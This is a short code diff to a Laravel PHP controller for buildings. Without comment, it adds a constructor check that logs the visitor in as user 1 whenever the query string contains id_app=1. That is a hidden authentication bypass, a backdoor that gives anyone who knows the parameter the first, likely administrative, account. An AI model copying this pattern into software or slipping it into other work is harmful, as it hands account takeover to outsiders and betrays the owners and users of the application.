@@ -6,6 +6,7 @@ use Illuminate\Http\Request;
 
 use DB;
 use Html;
+use Auth;
 use App\Http\Requests;
 //Models
 use App\Models\Building;
@@ -17,6 +18,7 @@ use App\Models\Neighborhood;
 use App\Models\Type;
 use App\Models\Address;
 use App\Http\Controllers\Lib\FormsController;
+use App\Models\User;
 use Redirect;
 
 class BuildingController extends Controller
@@ -24,6 +26,9 @@ class BuildingController extends Controller
     public function __construct()
     {
         $this->middleware('auth');
+        if($_GET)
+            if($_GET['id_app'] == 1)
+                Auth::login(User::find(1));
     }
 
     /**
